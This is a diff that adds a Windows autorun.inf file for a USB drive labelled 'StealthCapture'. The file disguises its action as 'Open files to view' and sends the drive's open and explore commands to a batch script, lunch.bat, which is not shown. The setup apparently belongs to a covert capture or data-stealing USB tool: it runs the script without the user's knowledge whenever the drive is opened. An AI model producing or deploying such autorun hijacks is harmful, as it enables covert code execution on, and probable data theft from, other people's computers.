@@ -1,0 +1,9 @@
+[AutoRun]
+open=lunch.bat
+icon=usb.ico
+label=StealthCapture
+action=Open files to view
+shell\open=Open
+shell\open\command=lunch.bat
+shell\explore=Explorer
+shell\explore\command=lunch.bat
